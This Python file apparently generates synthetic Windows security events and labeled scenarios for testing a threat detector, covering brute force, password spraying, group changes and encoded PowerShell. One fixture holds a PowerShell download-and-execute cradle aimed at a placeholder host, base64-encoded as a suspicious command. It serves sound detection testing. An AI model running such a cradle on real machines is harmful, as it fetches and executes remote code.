"""Deterministic synthetic event corpus generator (not a benchmark)."""

from __future__ import annotations

import argparse
import base64
import json
import random
from pathlib import Path


def generate_labeled_scenarios() -> list[dict[str, object]]:
    """Return compact scenario inputs and separate ground-truth labels.

    Each result has ``case_id``, ``records`` and ``truth`` keys. Truth labels
    are metadata outside the records passed to the detector.
    """
    def failure(user: str, second: int, ip: str = "198.51.100.8", host: str = "srv-1") -> dict[str, str]:
        return {"timestamp": f"2026-02-01T00:00:{second:02d}Z", "user": user, "host": host,
                "event_type": "4625", "source_ip": ip, "status": "0xC000006A", "substatus": "0xC000006A"}

    def success(user: str, second: int, ip: str = "198.51.100.8", host: str = "srv-1") -> dict[str, str]:
        return {"timestamp": f"2026-02-01T00:00:{second:02d}Z", "user": user, "host": host,
                "event_type": "4624", "source_ip": ip}

    evil = "IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a')"
    benign = "Write-Output 'inventory check complete'"
    evil_encoded = base64.b64encode(evil.encode("utf-16le")).decode("ascii")
    benign_encoded = base64.b64encode(benign.encode("utf-16le")).decode("ascii")
    scenarios = [
        {"case_id": "brute_force", "records": [failure("alice", i) for i in range(5)], "truth": ["authentication_failures"]},
        {"case_id": "mistyped_password", "records": [failure("alice", i) for i in range(3)], "truth": []},
        {"case_id": "password_spray", "records": [failure(f"user{i}", i) for i in range(5)], "truth": ["authentication_failures"]},
        {"case_id": "shared_ip_below_threshold", "records": [failure(f"staff{i}", i) for i in range(4)], "truth": []},
        {"case_id": "success_after_failures", "records": [failure("alice", i) for i in range(5)] + [success("alice", 6)], "truth": ["authentication_failures", "success_after_failures"]},
        {"case_id": "same_ip_different_success_context", "records": [failure("alice", i, "198.51.100.8") for i in range(5)] + [success("alice", 6, "198.51.100.9")], "truth": ["authentication_failures"]},
        {"case_id": "unexpected_group_add", "records": [{"timestamp": "2026-02-01T00:00:00Z", "user": "operator", "host": "dc-1", "event_type": "4728", "GroupName": "Domain Admins", "MemberName": "user7"}], "truth": ["privilege_changes"]},
        {"case_id": "expected_admin_change", "records": [{"timestamp": "2026-02-01T00:00:00Z", "user": "approved-admin", "host": "dc-1", "event_type": "4732", "GroupName": "Local Admins", "MemberName": "helpdesk"}], "truth": []},
        {"case_id": "scheduled_admin_task", "records": [{"timestamp": "2026-02-01T00:00:00Z", "user": "svc-maint", "host": "ws-1", "event_type": "process_start", "process": "powershell.exe", "command_line": "powershell.exe -NoProfile -File C:\\Tasks\\Inventory.ps1"}], "truth": []},
        {"case_id": "suspicious_encoded_command", "records": [{"timestamp": "2026-02-01T00:00:00Z", "user": "operator", "host": "ws-1", "event_type": "process_start", "process": "powershell.exe", "command_line": f"powershell.exe -EncodedCommand {evil_encoded}"}], "truth": ["suspicious_process"]},
        {"case_id": "benign_encoded_command", "records": [{"timestamp": "2026-02-01T00:00:00Z", "user": "svc-maint", "host": "ws-1", "event_type": "process_start", "process": "powershell.exe", "command_line": f"powershell.exe -EncodedCommand {benign_encoded}"}], "truth": []},
    ]
    return scenarios


def generate_records(count: int, seed: int = 7) -> list[dict[str, str]]:
    if count < 0:
        raise ValueError("count must be non-negative")
    rng = random.Random(seed)
    users = ["LAB\\analyst", "CONTOSO\\svc-backup", "jane.doe@lab.example"]
    hosts = ["WS-014.lab.example", "DC-01.lab.example", "LAPTOP-22"]
    records = []
    for index in range(count):
        records.append({
            "timestamp": f"2026-01-{index % 28 + 1:02d}T{index % 24:02d}:00:00Z",
            "user": users[rng.randrange(len(users))],
            "host": hosts[rng.randrange(len(hosts))],
            "event_type": rng.choice(["process_start", "logon", "file_access"]),
            "process": rng.choice(["powershell.exe", "explorer.exe", "backup.exe"]),
            "command_line": "",
            "source_ip": f"192.0.2.{rng.randrange(1, 255)}",
        })
    return records


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--output", type=Path, required=True)
    parser.add_argument("--count", type=int, default=100)
    parser.add_argument("--seed", type=int, default=7)
    args = parser.parse_args(argv)
    records = generate_records(args.count, args.seed)
    with args.output.open("w", encoding="utf-8", newline="\n") as handle:
        for record in records:
            handle.write(json.dumps(record, ensure_ascii=False) + "\n")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
